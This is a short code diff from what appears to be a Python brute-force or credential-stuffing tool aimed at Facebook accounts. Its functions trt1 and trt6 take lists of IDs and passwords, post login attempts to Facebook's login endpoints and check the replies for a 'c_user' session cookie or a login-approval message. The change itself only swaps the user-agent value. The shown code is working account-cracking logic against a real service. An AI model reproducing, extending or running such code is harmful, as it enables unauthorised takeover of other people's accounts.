@@ -1130,7 +1130,7 @@ def trt1(ids,passlist):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': ua}
+    'user-agent': pro}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
@@ -1565,7 +1565,7 @@ def trt6(ids,passlist):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': ua}
+    'user-agent': pro}
                         lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies:
